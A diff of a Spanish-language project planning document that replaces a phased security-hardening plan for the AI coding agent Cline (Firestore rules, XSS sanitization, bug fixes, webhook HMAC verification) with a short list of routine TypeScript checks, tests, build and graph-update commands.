-## 4. 📋 PLAN DE ACCIÓN PARA CLINE (VS CODE AGENT)
-
-Cline debe ejecutar las siguientes fases en orden secuencial:
-
-### 🔹 Fase 1: Blindaje de `firestore.rules` (Prioridad P0)
-1. **Regla S-1:** Corregir `allow create` en `/users/{userId}` para impedir auto-otorgamiento de `hasTicket`, `trustTier`, `isVerified` y arrays sensibles.
-2. **Regla S-2:** Agregar la regla completa para `match /kycReviews/{reviewId}`.
-3. **Regla S-3:** Declarar las reglas faltantes para `scouts`, `hosts`, `commission_ledger`, `payouts`, `audit_logs`, `host_offers`, `churn_surveys`, `invest_tokens`.
-4. **Optimización S-Staff:** Optimizar la función `isStaff()` en una sola llamada a `userRole()`.
-5. **Validar:** `node test/test-integrity-zero-functions.cjs`.
-
-### 🔹 Fase 2: Sanitización XSS y Creación de `src/utils.ts` (Prioridad P1)
-1. Crear `src/utils.ts` con la función `escapeHtml(str)`.
-2. Sanitizar en `src/crm.ts` la generación de cards (`card.innerHTML`).
-3. Sanitizar en `src/profile.ts` (`profileMeta.innerHTML`).
-4. Sanitizar en `src/bar.ts` (`renderAttendeesList`).
-5. Sanitizar en `src/notifications.ts` (`this.list.innerHTML`).
-6. Validar: `npx tsc --noEmit`.
-
-### 🔹 Fase 3: Reparación de Bugs en `src/bar.ts` y `src/api-client.ts` (Prioridad P1)
-1. **B-1:** Clonar `btnLogout` en `src/bar.ts` antes de vincular listener.
-2. **B-2:** Corregir parsing de errores en `src/api-client.ts:48`.
-3. **B-3:** Corregir cálculo de consumiciones e ingresos en `src/bar.ts:435-442` (1 cóctel de autor = $22.000 COP).
-4. **B-4:** Convertir `#menu-night-price` en un `<input type="number">` funcional en `src/bar.ts`.
-5. Validar: `npx tsc --noEmit`.
-
-### 🔹 Fase 4: Blindaje de Webhooks en Backend Serverless (Prioridad P2)
-1. En `functions-vercel/api/whatsapp-webhook.js`:
-   - Eliminar el fallback hardcodeado de token.
-   - Implementar verificación HMAC con `X-Hub-Signature-256`.
-2. En `functions-vercel/api/wompi-webhook.js`:
-   - Gestionar estados `DECLINED`/`ERROR` para limpiar `paymentPending: false`.
-
-### 🔹 Fase 5: Validación Técnica Total
-1. `node test/test-integrity-zero-functions.cjs` (5/5 OK).
-2. `node test/test-face-verification-suite.cjs` (15/15 OK).
-3. `npx tsc --noEmit` (0 errores).
-4. `npm run build` (Build exitoso en `dist/`).
+1. **Chequeo estático TypeScript:**
+   ```bash
+   npx tsc --noEmit
+   ```
+2. **Tests unitarios y de regresión B2B / CRM:**
+   ```bash
+   node test/test-crm-commission.cjs
+   npm run test:b2b
+   ```
+3. **Auditoría de contratos HTML / Footers:**
+   ```bash
+   npm run check:html
+   ```
+4. **Build de producción multi-página (Vite):**
+   ```bash
+   npm run build
+   ```
+5. **Actualización del grafo de conocimiento:**
+   ```bash
+   graphify update .
+   ```
